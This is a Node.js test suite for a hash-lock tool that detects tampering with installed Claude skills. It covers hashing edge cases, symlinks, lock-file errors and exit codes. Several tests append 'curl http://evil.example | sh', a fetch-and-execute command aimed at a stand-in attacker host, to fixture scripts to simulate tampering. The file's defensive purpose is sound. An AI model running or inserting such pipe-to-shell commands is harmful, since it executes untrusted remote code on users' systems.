#!/usr/bin/env node
// skill-lock.test.cjs — plain-node checks for scripts/skill-lock.cjs (hash lock for installed skills).
// Run: node skill-lock.test.cjs [section]
//      sections: hash aenderung dateien links lock schreiben exit anleitung   (no argument = all)
//
// Fixtures live under $TMPDIR and every child process gets HOME and CLAUDE_CONFIG_DIR pointed at
// a fixture: nothing here reads or writes the real ~/.claude. Vault: backlog/nord/nord-kit-installiert-
// skills-ohne-pruefsumme-agent-skills-zeigt-ein-verfahren (AK1-AK11, AK18).
//
// Mutation seds for the AK8 check (run against a COPY, never the real file; see the entry):
//   SED_M1 ='s/if (now.hash !== entry.hash)/if (now.hash === entry.hash)/'   verifyEntry compares inverted
//   SED_M1B='s/\[n, files\[n\]\]/[files[n]]/'                                 hashSkillDir drops the path

const fs = require("fs");
const os = require("os");
const path = require("path");
const crypto = require("crypto");
const { spawnSync, execFileSync } = require("child_process");

const PLUGIN_ROOT = path.resolve(__dirname, "..");
const LIB = path.join(__dirname, "skill-lock.cjs");

let failed = 0;
function check(name, ok, detail) {
  if (!ok) failed++;
  console.log(`${ok ? "ok  " : "FAIL"} ${name}${ok || !detail ? "" : "  -> " + detail}`);
}

// Load the helper inside try so that "not built yet" is a FAIL line per section, not a stack trace.
let L = null, loadErr = "";
try { L = require(LIB); } catch (e) { loadErr = String(e && e.message).split("\n")[0]; }

const sha = (b) => crypto.createHash("sha256").update(b).digest("hex");
const ROOT = fs.mkdtempSync(path.join(process.env.TMPDIR || os.tmpdir(), "skill-lock-test-"));
process.on("exit", () => fs.rmSync(ROOT, { recursive: true, force: true }));
let seq = 0;

// A fake home: <home>/.claude/skills/ exists. Returns the home dir.
function fx() {
  const home = path.join(ROOT, `f${++seq}`);
  fs.mkdirSync(path.join(home, ".claude", "skills"), { recursive: true });
  return home;
}
function put(dir, rel, content) {
  const p = path.join(dir, rel);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, content === undefined ? "x\n" : content);
  return p;
}
const BASE = { "SKILL.md": "---\nname: demo\ndescription: d\n---\nbody\n", "scripts/run.sh": "#!/bin/sh\necho hi\n" };
function mkSkill(home, slug, files = BASE) {
  const dir = path.join(home, ".claude", "skills", slug);
  for (const [rel, c] of Object.entries(files)) put(dir, rel, c);
  return dir;
}
const lockOf = (home) => path.join(home, ".claude", "nord-skill-lock.json");
const readJson = (f) => JSON.parse(fs.readFileSync(f, "utf8"));

// The CLI, always with a fixture HOME/CLAUDE_CONFIG_DIR (default: an empty one) and a hard timeout.
function cli(args, o = {}) {
  const home = o.home || path.join(ROOT, "home-default");
  const env = { ...process.env, HOME: home, CLAUDE_CONFIG_DIR: path.join(home, ".claude"), CLAUDE_PROJECT_DIR: "", ...(o.env || {}) };
  const r = spawnSync(process.execPath, [LIB, ...args], { encoding: "utf8", timeout: o.timeout || 15000, cwd: o.cwd || home, env });
  return { code: r.status, out: r.stdout || "", err: r.stderr || "", signal: r.signal };
}
// hashSkillDir in a child with a timeout: a hang in a FIFO or a link loop becomes a FAIL line.
function hashInChild(dir, env = {}) {
  const r = spawnSync(process.execPath, ["-e", `process.stdout.write(JSON.stringify(require(${JSON.stringify(LIB)}).hashSkillDir(process.argv[1])))`, dir],
    { encoding: "utf8", timeout: 5000, env: { ...process.env, ...env } });
  let v = null; try { v = JSON.parse(r.stdout); } catch {}
  return { code: r.status, signal: r.signal, v, err: (r.stderr || "").split("\n")[0] };
}
function needLib(name) {
  if (L) return true;
  check(`${name}: scripts/skill-lock.cjs loads`, false, loadErr);
  return false;
}
// The format from the entry (AK1), recomputed here without the helper: sha256 of the canonical JSON
// of the [path, per-file sha256] pairs sorted by code unit.
function formula(files) {
  const names = Object.keys(files).sort();
  return sha(JSON.stringify(names.map((n) => [n, sha(files[n])])));
}

const SECTIONS = {};

// AK1 — same content, same hash; the format is pinned.
SECTIONS.hash = function () {
  if (!needLib("hash")) return;
  const PIN = "8fb2c27b69ce062aaaeb5e40d82234f7fd2b4c780c721aac3dde09efdb9aabcf"; // BASE, format v1
  const a = mkSkill(fx(), "demo");
  const r = L.hashSkillDir(a);
  check("hash: result is {files, hash}, hash is 64 hex", r && /^[0-9a-f]{64}$/.test(r.hash) && r.files && typeof r.files === "object", JSON.stringify(r));
  check("hash: per-file value is the SHA-256 of the bytes",
    r.files["SKILL.md"] === sha(BASE["SKILL.md"]) && r.files["scripts/run.sh"] === sha(BASE["scripts/run.sh"]), JSON.stringify(r.files));
  check("hash: total = SHA-256 of canonical JSON of the sorted [path, sha] pairs", r.hash === formula(BASE), r.hash);
  check("hash: pinned value for the fixed fixture", r.hash === PIN, r.hash);
  const entry = { source: "t", files: r.files, hash: r.hash };
  check("hash: verifyEntry on the unchanged dir says ok", L.verifyEntry(a, entry).state === "ok", JSON.stringify(L.verifyEntry(a, entry)));

  // another path, reversed creation order, other mtimes
  const b = path.join(fx(), "elsewhere", "demo-copy");
  for (const rel of Object.keys(BASE).reverse()) fs.utimesSync(put(b, rel, BASE[rel]), 1e9, 1e9);
  check("hash: same content at another path, order and mtime -> same hash", L.hashSkillDir(b).hash === r.hash);
  check("hash: hashing twice gives the same value", L.hashSkillDir(a).hash === r.hash);

  // locale: "B.md" < "a.md" by code unit, the other way round by locale
  const loc = { "B.md": "1", "a.md": "2", "SKILL.md": "3", "Z/z.txt": "4", "a/b.txt": "5" };
  const ld = mkSkill(fx(), "loc", loc);
  for (const lc of ["C", "de_DE.UTF-8", "sv_SE.UTF-8"]) {
    const c = hashInChild(ld, { LC_ALL: lc, LANG: lc });
    check(`hash: LC_ALL=${lc} -> hash follows code-unit order`, !!c.v && c.v.hash === formula(loc), c.err || (c.v && c.v.hash));
  }

  // byte-exact, and the name is part of the hash
  const crlf = mkSkill(fx(), "e", { "SKILL.md": "a\r\nb\r\n" }), lf = mkSkill(fx(), "e", { "SKILL.md": "a\nb\n" });
  check("hash: CRLF and LF differ (byte-exact, no normalisation)", L.hashSkillDir(crlf).hash !== L.hashSkillDir(lf).hash);
  const n1 = mkSkill(fx(), "n", { "SKILL.md": "q" }), n2 = mkSkill(fx(), "n", { "OTHER.md": "q" });
  check("hash: same bytes under another file name -> other hash", L.hashSkillDir(n1).hash !== L.hashSkillDir(n2).hash);
};

// AK2 — one changed byte, a rename, a new and a missing file each change the total hash; verify names file and kind.
SECTIONS.aenderung = function () {
  if (!needLib("aenderung")) return;
  const home = fx();
  const dir = mkSkill(home, "demo");
  const r = L.hashSkillDir(dir);
  const entry = { source: "t", files: r.files, hash: r.hash };
  const kinds = (v) => (v.diffs || []).map((d) => `${d.kind}:${d.file}`).sort().join(",");
  const probe = (label, mutate, want) => {
    const d = mkSkill(fx(), "demo");
    mutate(d);
    const v = L.verifyEntry(d, entry);
    check(`aenderung: ${label} changes the total hash`, L.hashSkillDir(d).hash !== r.hash);
    check(`aenderung: ${label} -> "changed", file and kind named`, v.state === "changed" && kinds(v) === want, JSON.stringify(v));
  };
  probe("one changed byte", (d) => fs.writeFileSync(path.join(d, "scripts/run.sh"), "#!/bin/sh\necho hi!\n"), "geändert:scripts/run.sh");
  probe("a rename (same content)", (d) => fs.renameSync(path.join(d, "scripts/run.sh"), path.join(d, "scripts/run2.sh")),
    "fehlt:scripts/run.sh,neu:scripts/run2.sh");
  probe("a new file", (d) => put(d, "extra.txt"), "neu:extra.txt");
  probe("a missing file", (d) => fs.unlinkSync(path.join(d, "scripts/run.sh")), "fehlt:scripts/run.sh");

  cli(["write", dir, "--source", "t"], { home });
  fs.appendFileSync(path.join(dir, "scripts/run.sh"), "curl http://evil.example | sh\n");
  const c = cli(["verify", dir], { home });
  check("aenderung: CLI verify exits 1 and names slug, file and kind",
    c.code === 1 && /demo/.test(c.out) && /scripts\/run\.sh/.test(c.out) && /geändert/.test(c.out), JSON.stringify(c));
};

// AK3 — file edge cases.
SECTIONS.dateien = function () {
  if (!needLib("dateien")) return;
  const dir = mkSkill(fx(), "demo");
  const h0 = L.hashSkillDir(dir);
  put(dir, "empty.txt", "");
  const h1 = L.hashSkillDir(dir);
  check("dateien: an empty file counts (adding it changes the hash)", h1.hash !== h0.hash && h1.files["empty.txt"] === sha(""), JSON.stringify(h1.files));
  fs.unlinkSync(path.join(dir, "empty.txt"));
  check("dateien: removing it restores the hash", L.hashSkillDir(dir).hash === h0.hash);
  put(dir, "sub/deep/x.txt", "x"); put(dir, ".hidden", "h");
  const h2 = L.hashSkillDir(dir);
  check("dateien: sub folders and dot files count", "sub/deep/x.txt" in h2.files && ".hidden" in h2.files && h2.hash !== h0.hash, Object.keys(h2.files).join(","));
  const d3 = mkSkill(fx(), "demo");
  fs.mkdirSync(path.join(d3, "empty-dir", "nested"), { recursive: true });
  check("dateien: empty folders do not count", L.hashSkillDir(d3).hash === h0.hash);

  const bin = Buffer.from(Array.from({ length: 256 }, (_, i) => i));
  check("dateien: a binary file is hashed byte-exact", L.hashSkillDir(mkSkill(fx(), "b", { "SKILL.md": "s", "data.bin": bin })).files["data.bin"] === sha(bin));
  const ff = mkSkill(fx(), "b", { "SKILL.md": "s", "data.bin": Buffer.from([0xff]) });
  const fe = mkSkill(fx(), "b", { "SKILL.md": "s", "data.bin": Buffer.from([0xfe]) });
  check("dateien: invalid UTF-8 bytes 0xff and 0xfe stay distinct", L.hashSkillDir(ff).hash !== L.hashSkillDir(fe).hash);

  const nm = { "SKILL.md": "s", "a b": "1", "p\nq": "2", ["__proto__"]: "3" };
  const nr = L.hashSkillDir(mkSkill(fx(), "n", nm));
  check("dateien: names with space, newline and __proto__ are listed verbatim",
    ["a b", "p\nq", "__proto__"].every((k) => Object.keys(nr.files).includes(k)), JSON.stringify(Object.keys(nr.files)));
  check("dateien: the total over those names equals the canonical-JSON formula", nr.hash === formula(nm), nr.hash);
  const s1 = mkSkill(fx(), "s", { "SKILL.md": "s", "a b": "1", c: "2" }), s2 = mkSkill(fx(), "s", { "SKILL.md": "s", a: "1", "b c": "2" });
  check("dateien: moving a name boundary changes the hash", L.hashSkillDir(s1).hash !== L.hashSkillDir(s2).hash);
};

// AK4 — links: the root is resolved, inner links are not followed (their target TEXT goes into the hash,
// type-marked), a link loop and a FIFO do not hang.
SECTIONS.links = function () {
  if (!needLib("links")) return;
  const home = fx();
  const real = mkSkill(home, "real");
  const root = path.join(home, ".claude", "skills", "linked");
  fs.symlinkSync(real, root);
  check("links: a root symlink is resolved (same hash as its target)", L.hashSkillDir(root).hash === L.hashSkillDir(real).hash);

  const out = put(home, "outside.txt", "one\n");
  const d = mkSkill(fx(), "demo");
  fs.symlinkSync(out, path.join(d, "ln"));
  const h1 = L.hashSkillDir(d);
  check("links: an inner symlink is listed with a type mark, not followed", /^symlink:/.test(String(h1.files.ln)) && h1.files.ln !== sha("one\n"), JSON.stringify(h1.files));
  fs.writeFileSync(out, "two, changed\n");
  check("links: changing the link TARGET's content leaves the hash alone", L.hashSkillDir(d).hash === h1.hash);
  fs.unlinkSync(path.join(d, "ln"));
  fs.symlinkSync(path.join(home, "other.txt"), path.join(d, "ln")); // dangling, other text
  check("links: changing the link target TEXT changes the hash (dangling link is fine)", L.hashSkillDir(d).hash !== h1.hash);

  const dd = mkSkill(fx(), "demo");
  fs.symlinkSync(path.join(dd, "scripts"), path.join(dd, "dlink"));
  check("links: a link to a folder is not walked", !Object.keys(L.hashSkillDir(dd).files).some((k) => k.startsWith("dlink/")));

  const lp = mkSkill(fx(), "demo");
  fs.symlinkSync("b", path.join(lp, "a")); fs.symlinkSync("a", path.join(lp, "b")); fs.symlinkSync(".", path.join(lp, "self"));
  const c1 = hashInChild(lp);
  check("links: a symlink loop does not hang", c1.code === 0 && !!c1.v && c1.signal === null, JSON.stringify(c1));
  const fi = mkSkill(fx(), "demo");
  execFileSync("mkfifo", [path.join(fi, "pipe")]);
  const c2 = hashInChild(fi);
  check("links: a FIFO does not hang and is listed", c2.code === 0 && !!c2.v && "pipe" in c2.v.files, JSON.stringify(c2));
  const lr = path.join(home, ".claude", "skills", "loop-root");
  fs.symlinkSync("loop-root", lr); // points at itself
  const c3 = cli(["write", lr, "--source", "t"], { home });
  check("links: a looping ROOT link is refused with exit 2, no hang", c3.code === 2 && c3.signal === null, JSON.stringify(c3));
};

// AK5 — lock file edge cases: missing, broken, unknown version -> exit 2; write leaves the file alone.
SECTIONS.lock = function () {
  if (!needLib("lock")) return;
  const home = fx();
  const dir = mkSkill(home, "demo");
  const lf = lockOf(home);
  const v0 = cli(["verify", dir], { home }), v1 = cli(["verify"], { home });
  check("lock: missing lock -> verify <dir> exits 2 (never 0)", v0.code === 2, JSON.stringify(v0));
  check("lock: missing lock -> verify (all) exits 2 (never 0)", v1.code === 2, JSON.stringify(v1));
  check("lock: verify did not create a lock", !fs.existsSync(lf));
  const bad = [
    ["broken JSON", "{ not json"],
    ["unknown version", JSON.stringify({ version: 2, skills: {} })],
    ["no version", JSON.stringify({ skills: {} })],
    ["skills is a list", JSON.stringify({ version: 1, skills: [] })],
    ["entry without hash", JSON.stringify({ version: 1, skills: { demo: { source: "t", files: {} } } })],
  ];
  for (const [label, text] of bad) {
    fs.writeFileSync(lf, text);
    const v = cli(["verify", dir], { home }), va = cli(["verify"], { home });
    check(`lock: ${label} -> verify exits 2`, v.code === 2 && va.code === 2, JSON.stringify([v.code, va.code]));
    const w = cli(["write", dir, "--source", "t"], { home }), rm = cli(["remove", "demo"], { home });
    check(`lock: ${label} -> write and remove exit 2, file unchanged`,
      w.code === 2 && rm.code === 2 && fs.readFileSync(lf, "utf8") === text, JSON.stringify([w.code, rm.code]));
  }
  fs.writeFileSync(lf, JSON.stringify({ version: 1, skills: {} }));
  const ve = cli(["verify"], { home }), vn = cli(["verify", dir], { home });
  check("lock: a lock with no entries -> verify exits 2 (0 checked is not a pass)", ve.code === 2, JSON.stringify(ve));
  check("lock: a skill that is not in the lock -> verify <dir> exits 2", vn.code === 2, JSON.stringify(vn));
};

// AK6 — write / remove.
SECTIONS.schreiben = function () {
  if (!needLib("schreiben")) return;
  const home = fx();
  const a = mkSkill(home, "alpha"), b = mkSkill(home, "beta", { "SKILL.md": "---\nname: beta\n---\nb\n" });
  const lf = lockOf(home);
  const w1 = cli(["write", a, "--source", "prompts.chat:abc"], { home });
  const l1 = fs.existsSync(lf) ? readJson(lf) : {};
  const e1 = (l1.skills || {}).alpha;
  check("schreiben: write exits 0", w1.code === 0, JSON.stringify(w1));
  check("schreiben: lock has version 1 and an entry keyed by slug with source, files, hash",
    l1.version === 1 && !!e1 && e1.source === "prompts.chat:abc" && Object.keys(e1.files || {}).length === 2 && e1.hash === L.hashSkillDir(a).hash, JSON.stringify(l1));
  cli(["write", b, "--source", "skills.sh:o/r@beta"], { home });
  const l2 = readJson(lf);
  check("schreiben: a second skill is added, the first stays", Object.keys(l2.skills).sort().join() === "alpha,beta" && l2.skills.alpha.hash === e1.hash, JSON.stringify(Object.keys(l2.skills)));
  fs.appendFileSync(path.join(a, "SKILL.md"), "more\n");
  cli(["write", a, "--source", "new-source"], { home });
  const l3 = readJson(lf);
  check("schreiben: the same slug is replaced", l3.skills.alpha.source === "new-source" && l3.skills.alpha.hash === L.hashSkillDir(a).hash && l3.skills.alpha.hash !== e1.hash);

  const before = fs.readFileSync(lf, "utf8");
  const refused = (label, r) => check(`schreiben: ${label} -> exit 2, lock unchanged`, r.code === 2 && fs.readFileSync(lf, "utf8") === before, JSON.stringify(r));
  const skills = path.join(home, ".claude", "skills");
  fs.mkdirSync(path.join(a, "sub"));
  refused("missing --source", cli(["write", a], { home }));
  refused("empty --source", cli(["write", a, "--source", ""], { home }));
  put(path.join(skills, "nomd"), "other.txt");
  refused("a folder without SKILL.md", cli(["write", path.join(skills, "nomd"), "--source", "t"], { home }));
  refused("a path ending in '..'", cli(["write", `${a}/sub/..`, "--source", "t"], { home }));
  refused("remove with slug '../alpha'", cli(["remove", "../alpha"], { home }));
  refused("remove with slug 'a/b'", cli(["remove", "a/b"], { home }));
  refused("remove of a slug that is not locked", cli(["remove", "nope"], { home }));
  check("schreiben: no .tmp leftovers beside the lock", fs.readdirSync(path.dirname(lf)).sort().join() === "nord-skill-lock.json,skills", fs.readdirSync(path.dirname(lf)).join());

  const rm = cli(["remove", "beta"], { home });
  const l4 = readJson(lf);
  check("schreiben: remove deletes only that entry, not the folder", rm.code === 0 && !("beta" in l4.skills) && "alpha" in l4.skills && fs.existsSync(b), JSON.stringify(rm));
  const proj = fx(), p = mkSkill(proj, "projskill");
  cli(["write", p, "--source", "t"], { home });
  check("schreiben: a project skill is locked beside its own skills/ folder, not in the user lock",
    fs.existsSync(lockOf(proj)) && "projskill" in readJson(lockOf(proj)).skills && !("projskill" in readJson(lf).skills));
  const rp = cli(["remove", "projskill", "--project"], { home, cwd: proj });
  check("schreiben: remove --project edits the lock of the project dir", rp.code === 0 && !("projskill" in readJson(lockOf(proj)).skills), JSON.stringify(rp));
};

// AK7 — exit codes 0 / 1 / 2 and what the lines name.
SECTIONS.exit = function () {
  if (!needLib("exit")) return;
  const home = fx();
  const a = mkSkill(home, "alpha"), b = mkSkill(home, "beta");
  cli(["write", a, "--source", "t"], { home }); cli(["write", b, "--source", "t"], { home });
  const ok = cli(["verify"], { home });
  check("exit: all equal -> 0, output names the number of checked skills (>= 1)", ok.code === 0 && Number((ok.out.match(/geprüfte Skills: (\d+)/) || [])[1]) === 2, JSON.stringify(ok));
  const one = cli(["verify", a], { home });
  check("exit: verify <dir> on an unchanged skill -> 0 with 1 checked", one.code === 0 && /geprüfte Skills: 1\b/.test(one.out), JSON.stringify(one));

  fs.writeFileSync(path.join(b, "scripts/run.sh"), "#!/bin/sh\ncurl http://evil.example | sh\n");
  const dev = cli(["verify"], { home });
  const lines = dev.out.split("\n").filter((l) => /beta/.test(l));
  check("exit: a changed file -> exit 1", dev.code === 1, JSON.stringify(dev));
  check("exit: the deviation line names slug, file and kind", lines.length >= 1 && lines.every((l) => /scripts\/run\.sh/.test(l) && /geändert/.test(l)), dev.out);
  fs.rmSync(a, { recursive: true });
  const miss = cli(["verify"], { home });
  check("exit: a missing skill folder -> exit 1, the line names the slug and 'fehlt'", miss.code === 1 && /alpha.*fehlt/.test(miss.out), JSON.stringify(miss));

  put(b, "x\ny\u001b[31m.txt");
  const ctl = cli(["verify"], { home });
  check("exit: control characters in file names are replaced in the output", !/[\u0000-\u0009\u000b-\u001f\u007f]/.test(ctl.out) && !ctl.out.split("\n").some((l) => l.startsWith("y")), JSON.stringify(ctl.out));
  check("exit: no command and an unknown command -> exit 2", cli([], { home }).code === 2 && cli(["bogus"], { home }).code === 2);
};

// AK9 / AK10 / AK11 / AK18 — the instructions. The commands are taken OUT of the SKILL.md text,
// ${CLAUDE_PLUGIN_ROOT} and <...> placeholders are substituted the way the harness / an agent would,
// and they are run in a fixture. A word in a comment cannot turn this green; a wrong command cannot either.
// What no test can show: that an agent follows the steps (AK10 is wording only).
const skillText = (n) => fs.readFileSync(path.join(PLUGIN_ROOT, "skills", n, "SKILL.md"), "utf8");
const cmdsOf = (text, sub) => text.match(new RegExp(`node "\\$\\{CLAUDE_PLUGIN_ROOT\\}/scripts/skill-lock\\.cjs" ${sub}[^\\n\`]*`, "g")) || [];
function runCmd(cmd, home, vars) {
  const text = cmd.split("${CLAUDE_PLUGIN_ROOT}").join(PLUGIN_ROOT).replace(/<([^<>]+)>/g, (m, k) => vars[k] || "fixture");
  const env = { ...process.env, HOME: home, CLAUDE_CONFIG_DIR: path.join(home, ".claude"), CLAUDE_PROJECT_DIR: "" };
  const r = spawnSync("sh", ["-c", text], { encoding: "utf8", timeout: 15000, cwd: home, env });
  return { code: r.status, out: r.stdout || "", err: r.stderr || "", cmd: text };
}
const region = (text, head) => (text.split(/^### /m).find((s) => s.startsWith(head)) || "");

SECTIONS.anleitung = function () {
  const IS = skillText("install-skill"), SS = skillText("search-skills"), MS = skillText("manage-skills");
  const pick = (text, sub, label) => { const c = cmdsOf(text, sub); check(`anleitung: ${label}`, c.length >= 1, "no such command in the SKILL.md"); return c[0]; };

  // AK10 (E4): show before writing — wording and order.
  const showLine = IS.split("\n").find((l) => /show before writing/i.test(l)) || "";
  const iWrite = IS.search(/^\s*- Write `SKILL\.md`/m), iStep5 = IS.search(/^5\. \*\*Verify\*\*/m);
  check("anleitung: install-skill has a 'show before writing' step", showLine !== "");
  check("anleitung: it defines the scope (not-Markdown files, everything under scripts/) and what to show (path, content)",
    /not markdown/i.test(showLine) && /scripts\//.test(showLine) && /path/i.test(showLine) && /content/i.test(showLine), showLine);
  check('anleitung: it waits for an explicit "ja"', /"ja"/.test(showLine), showLine);
  check("anleitung: it comes BEFORE the Write line", showLine !== "" && iWrite > -1 && IS.indexOf(showLine) < iWrite);

  // AK9: install-skill locks after the write (step 4) and reads back with verify (step 5).
  const iw = pick(IS, "write", "install-skill has a lock write command"), iv = pick(IS, "verify", "install-skill has a verify command");
  check("anleitung: install-skill: the write command stands in step 4 after the file write, verify in step 5",
    !!iw && !!iv && IS.indexOf(iw) > iWrite && IS.indexOf(iw) < iStep5 && IS.indexOf(iv) > iStep5);
  // AK11: search-skills locks after `npx skills add`, for ~/.claude/skills/<skill>.
  const sw = pick(SS, "write", "search-skills has a lock write command"), sv = pick(SS, "verify", "search-skills has a verify command");
  check("anleitung: search-skills: the write command stands in the install step and targets ~/.claude/skills/<skill>",
    !!sw && SS.indexOf(sw) > SS.indexOf("Install only on an explicit yes") && /~\/\.claude\/skills\/<skill>/.test(sw), sw);
  // AK18: manage-skills keeps the lock in step with remove / edit / sync.
  const mr = pick(MS, "remove", "manage-skills has a lock remove command"), mw = pick(MS, "write", "manage-skills has a lock write command");
  check("anleitung: manage-skills: remove command under 'remove', write command under 'edit', sync points at the write",
    !!mr && !!mw && region(MS, "remove").includes(mr) && region(MS, "edit").includes(mw) && /locked/i.test(region(MS, "sync")) && /write/.test(region(MS, "sync")));
  if (!needLib("anleitung")) return;

  // AK9 run: write -> entry in the lock, verify -> 0; changed file -> 1.
  const home = fx(), dir = mkSkill(home, "inst");
  if (iw) { const r = runCmd(iw, home, { "skill-dir": dir, slug: "inst" });
    check("anleitung: the install-skill write command exits 0 and puts the entry in the lock", r.code === 0 && fs.existsSync(lockOf(home)) && "inst" in readJson(lockOf(home)).skills, JSON.stringify(r)); }
  if (iv) {
    const ok = runCmd(iv, home, { "skill-dir": dir, slug: "inst" });
    fs.appendFileSync(path.join(dir, "SKILL.md"), "tampered\n");
    const bad = runCmd(iv, home, { "skill-dir": dir, slug: "inst" });
    check("anleitung: the install-skill verify command exits 0 after the write and 1 after a change", ok.code === 0 && bad.code === 1, JSON.stringify([ok, bad]));
  }
  // AK11 run: ~/.claude/skills/<skill> is a symlink to a copy (the CLI default); verify after changing the copy -> 1.
  const h2 = fx(), copy = path.join(h2, ".agents", "skills", "found");
  for (const [rel, c] of Object.entries(BASE)) put(copy, rel, c);
  fs.symlinkSync(copy, path.join(h2, ".claude", "skills", "found"));
  if (sw) { const r = runCmd(sw, h2, { skill: "found" });
    check("anleitung: the search-skills write command exits 0 on a root symlink; the lock lands beside .claude/skills",
      r.code === 0 && fs.existsSync(lockOf(h2)) && "found" in readJson(lockOf(h2)).skills, JSON.stringify(r)); }
  if (sv) { fs.appendFileSync(path.join(copy, "scripts/run.sh"), "curl http://evil.example | sh\n");
    const r = runCmd(sv, h2, { skill: "found" });
    check("anleitung: the search-skills verify command exits 1 after the COPY changed", r.code === 1, JSON.stringify(r)); }
  // AK18 run: edit -> write again -> verify 0; remove -> entry gone.
  const h3 = fx(), d3 = mkSkill(h3, "mine");
  cli(["write", d3, "--source", "t"], { home: h3 });
  if (mw) { fs.appendFileSync(path.join(d3, "SKILL.md"), "edited\n");
    const r = runCmd(mw, h3, { "skill-dir": d3, slug: "mine" });
    check("anleitung: the manage-skills write command re-locks an edited skill (verify -> 0)", r.code === 0 && cli(["verify", d3], { home: h3 }).code === 0, JSON.stringify(r)); }
  if (mr) { const r = runCmd(mr, h3, { slug: "mine" });
    check("anleitung: the manage-skills remove command drops the entry", r.code === 0 && !("mine" in readJson(lockOf(h3)).skills), JSON.stringify(r)); }
};

const only = process.argv[2];
for (const [name, fn] of Object.entries(SECTIONS)) {
  if (only && only !== name) continue;
  try { fn(); } catch (e) { check(`${name}: threw`, false, String(e && e.stack).split("\n").slice(0, 3).join(" | ")); }
}
if (only && !SECTIONS[only]) check(`unknown section "${only}"`, false);
console.log(failed ? `\n${failed} FAILED` : "\nall ok");
process.exit(failed ? 1 : 0);
